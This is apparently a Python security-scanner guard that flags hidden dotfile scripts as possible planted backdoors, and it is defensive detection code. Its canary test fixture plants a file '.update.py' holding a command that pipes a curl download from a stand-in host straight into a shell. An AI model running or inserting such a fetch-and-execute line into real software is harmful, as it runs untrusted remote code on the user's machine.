"""Guard: no hidden (dotfile) executable script committed to the repo (checklist §8, new item).

A file whose name starts with `.` is hidden from a plain `ls`/default directory
listing and easy to overlook in a casual code review or a quick `find *.py`-style
sweep — yet if it also carries a script-executable extension, it runs exactly like
any other script the moment something invokes it (a build step, a cron entry, a
malicious agent-skill bundle's install hook). This is a common persistence/hiding
technique for a planted backdoor (CWE-506, Embedded Malicious Code): a name like
`.update.sh` or `.cache.py` blends into a directory listing of legitimate dotfiles
(`.env`, `.gitignore`, `.eslintrc`) while still being fully executable.

Scoped to five extensions with no common legitimate hidden-dotfile use
(`.py`, `.sh`, `.bash`, `.rb`, `.pl`) — deliberately excluding `.js`/`.ts`, where
hidden config files (`.eslintrc.js`, `.babelrc.js`, `.prettierrc.js`, ...) are an
extremely common and entirely legitimate convention that would otherwise dominate
the findings with noise.

Fires MEDIUM — a filename-only signal (no content pattern is required to trigger),
so this is a "worth a look" flag, not proof of malice. Suppress an audited case with
a pragma comment anywhere in the file:

    # security: allow-hidden-executable-dotfile
"""
from __future__ import annotations

import re
from pathlib import Path

from agentsec.detect import StackProfile
from agentsec.findings import Finding

from .base import (
    CanaryPlant,
    Guard,
    comment_dialect_for,
    is_nonproduct_path,
    iter_files_named,
    pragma_present,
    read,
    rel,
)

_EXTENSIONS = (".py", ".sh", ".bash", ".rb", ".pl")
_NAME_GLOBS = tuple(f".*{ext}" for ext in _EXTENSIONS)
_PRAGMA = re.compile(r"security:\s*allow-hidden-executable-dotfile")

_STANDARDS = ["OWASP:A08", "CWE-506"]


class HiddenExecutableDotfileGuard(Guard):
    id = "hidden-executable-dotfile"
    title = "No hidden (dotfile) executable script committed to the repo"
    area = "Code safety"

    # .update.py: a hidden (dot-prefixed) file with a .py extension -> fires
    # hidden-executable-dotfile/dotfile-script (MEDIUM). Must NOT contain: security:
    # allow-hidden-executable-dotfile pragma.
    canary_plant = CanaryPlant(
        files={
            ".update.py": "import os\n\nos.system('curl http://example.com/x | sh')\n",
        },
        expects=frozenset({"hidden-executable-dotfile/dotfile-script"}),
    )

    def applies(self, profile: StackProfile) -> bool:  # noqa: ARG002
        return True  # universal: a hidden executable is a property of the filename, not the stack

    def run(self, root: Path, profile: StackProfile) -> list[Finding]:
        out: list[Finding] = []
        for f in iter_files_named(root, *_NAME_GLOBS):
            rel_path = rel(root, f)
            if is_nonproduct_path(rel_path, profile.archive_segments):
                continue
            if pragma_present(_PRAGMA, read(f), dialect=comment_dialect_for(f)):
                continue
            out.append(self._finding(root, f))
        return out

    def _finding(self, root: Path, f: Path) -> Finding:
        return Finding(
            check_id=self.id,
            severity="medium",
            title=self.title,
            location=rel(root, f),
            message=(
                f"'{f.name}' is a hidden (dot-prefixed) file with a script-executable "
                "extension. Hiding an executable script behind a dotfile name is a "
                "common technique for a planted/persisted malicious script blending "
                "into a directory listing of ordinary dotfiles."
            ),
            remediation=(
                "If this script is legitimately part of the build/tooling, give it a "
                "visible (non-dot-prefixed) name. If it should stay hidden, confirm its "
                "contents and provenance are trusted before accepting the audit."
            ),
            rule="hidden-executable-dotfile/dotfile-script",
            standards=list(_STANDARDS),
        )
